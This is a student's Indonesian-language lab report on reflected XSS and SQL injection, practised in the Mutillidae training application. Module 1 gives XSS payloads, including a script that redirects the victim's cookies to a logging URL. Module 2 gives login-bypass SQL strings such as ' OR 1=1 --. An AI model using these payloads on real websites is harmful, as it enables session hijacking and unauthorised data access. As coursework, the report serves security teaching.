# Lap10_PrakKI_RivaMahyuli_478709

# MODUL 1
Cross site scripting adalah serangan injeksi kode pada sisi klien dengan menggunakan sarana halaman website atau web aplikasi.  Peretas akan mengeksekusi skrip berbahaya di browser korban dengan cara memasukkan kode berbahaya ke halaman web atau web aplikasi yang sah.
salah satu jenis Cross site scripting adalah Reflected. Reflected adalah serangan pada aplikasi web yang memanfaatkan celah dalam penanganan input dari pengguna. Dalam serangan ini, skrip berbahaya disisipkan ke dalam permintaan HTTP yang dikirim ke aplikasi web, kemudian disalin atau "direfleksikan" kembali ke halaman yang diberikan kepada pengguna sebagai respons. Ketika pengguna melihat halaman tersebut, skrip berbahaya dieksekusi oleh browser pengguna tanpa disadari, yang dapat mengakibatkan pencurian data sensitif, pengalihan ke situs palsu, atau aksi jahat lainnya. Serangan ini biasanya digunakan untuk mengeksploitasi kekurangan dalam validasi input dan sanitasi data yang dilakukan oleh aplikasi web

Pada praktikum ini kita menggunakan mutillidae. Mutilidae pada Kali Linux menyediakan berbagai contoh kerentanan umum pada aplikasi web, seperti serangan injeksi SQL, cross-site scripting (XSS), cross-site request forgery (CSRF), dan lainnya. Pengguna dapat menggunakan Mutilidae untuk melatih dan meningkatkan pemahaman mereka tentang keamanan aplikasi web, serta menguji teknik dan alat keamanan yang berbeda.

Perintah "<script>alert("Halo")</script>" yang dimasukkan ke dalam Hostname/IP Textbox pada Mutilidae XSS Reflected DNS berfungsi sebagai contoh serangan XSS (Cross-Site Scripting). XSS adalah jenis serangan yang memungkinkan penyerang menyisipkan skrip berbahaya ke dalam halaman web yang kemudian dieksekusi oleh browser pengguna.Dalam contoh tersebut, skrip "<script>alert("Halo")</script>" akan dieksekusi oleh browser saat halaman web yang mengandung serangan XSS tersebut dimuat. Hasilnya, akan muncul kotak dialog yang menampilkan pesan "Halo". Serangan XSS semacam ini dapat dimanfaatkan oleh penyerang untuk mencuri informasi pengguna, menyebarkan malware, atau melakukan tindakan jahat lainnya.

perintah "<script>alert(document.cookie)</script>" dieksekusi pada Mutilidae XSS, hasilnya akan tergantung pada konteks dan kondisi saat skrip dieksekusi.Secara umum, skrip tersebut akan menampilkan nilai cookie dari situs web yang sedang dikunjungi oleh pengguna yang terkena serangan XSS. Cookie adalah file teks yang berisi informasi kecil yang disimpan pada komputer pengguna oleh situs web yang dikunjungi. Informasi yang dapat ada dalam cookie termasuk sesi pengguna, preferensi pengguna, atau data lain yang relevan dengan interaksi dengan situs web

Perintah "<SCRIPT>document.location='http://localhost/cgi-bin/logit.pl?'+document.cookie</SCRIPT>" adalah contoh serangan XSS (Cross-Site Scripting) yang bertujuan untuk mengeksploitasi kerentanan XSS pada sebuah halaman web. Fungsi dari perintah tersebut adalah untuk mengalihkan atau memperbarui lokasi (URL) halaman web ke "http://localhost/cgi-bin/logit.pl?" yang diikuti oleh nilai cookie dari halaman tersebut menggunakan "document.cookie". Dengan demikian, perintah tersebut mencoba mengirimkan informasi cookie pengguna ke URL yang ditentukan dalam serangan XSS.

# MODUL 2
SQL Injection adalah serangan yang dilakukan dengan menyisipkan kode SQL berbahaya ke dalam input yang diterima oleh aplikasi web yang menggunakan database. Serangan ini bertujuan untuk memanipulasi atau mendapatkan akses tidak sah ke basis data aplikasi tersebut.

# "Single Quote Test" pada form Username di Mutilidae adalah 
salah satu metode untuk menguji kerentanan SQL Injection pada aplikasi tersebut. Pada form Username, dengan memasukkan tanda kutip tunggal (') sebagai input, aplikasi akan mencoba mengeksekusi query SQL menggunakan input tersebut.Jika aplikasi tidak memvalidasi atau menyaring input dengan benar sebelum menggunakannya dalam query SQL, tanda kutip tunggal tersebut dapat mengganggu struktur query dan memungkinkan penyerang untuk menyisipkan kode SQL berbahaya. Misalnya, input seperti "admin' OR '1'='1" dapat mengubah query menjadi "SELECT * FROM users WHERE username='admin' OR '1'='1'", yang mungkin memungkinkan penyerang untuk mengakses data pengguna tanpa otorisasi.Dengan melakukan "Single Quote Test" dan berhasil menyebabkan aplikasi menghasilkan hasil yang tidak diharapkan atau pesan error yang mengungkapkan struktur query, penyerang dapat mengetahui bahwa aplikasi rentan terhadap serangan SQL Injection.

# SQL Injection: By-Pass Password tanpa Username adalah adalah serangan yang sangat serius 

# SQL Injection: Single Quote Test On Password Field
Melakukan "Single Quote Test" pada kolom kata sandi dalam konteks SQL Injection melibatkan menyisipkan karakter tanda kutip tunggal (') sebagai input ke kolom kata sandi sebuah aplikasi untuk menguji potensi kerentanan SQL injection.Tujuan dari pengujian ini adalah untuk mengetahui apakah aplikasi dapat menangani karakter tanda kutip tunggal dengan benar dan melakukan validasi dan sanitasi input yang tepat pada kolom kata sandi. Jika aplikasi gagal menangani karakter tanda kutip tunggal dengan benar, kemungkinan besar aplikasi tersebut rentan terhadap serangan SQL injection.Dengan menyisipkan karakter tanda kutip tunggal ke kolom kata sandi, seorang penyerang dapat mencoba mengganggu sintaks SQL dari query yang mendasarinya dan potensialnya mendapatkan akses tanpa otorisasi ke basis data aplikasi. Sebagai contoh, jika aplikasi membangun query SQL tanpa melakukan sanitasi input dengan benar, input seperti " ' OR 1=1 -- " dapat memanipulasi query agar selalu bernilai benar, melewati verifikasi kata sandi.Perlu diingat bahwa melakukan pengujian SQL Injection tanpa izin yang tepat atau dalam skenario dunia nyata adalah ilegal dan tidak etis. SQL Injection adalah kerentanan keamanan yang serius, dan penting untuk mengamankan aplikasi dengan menerapkan praktik pengkodean yang aman, pengikatan parameter, dan teknik validasi input untuk mencegah serangan semacam itu.




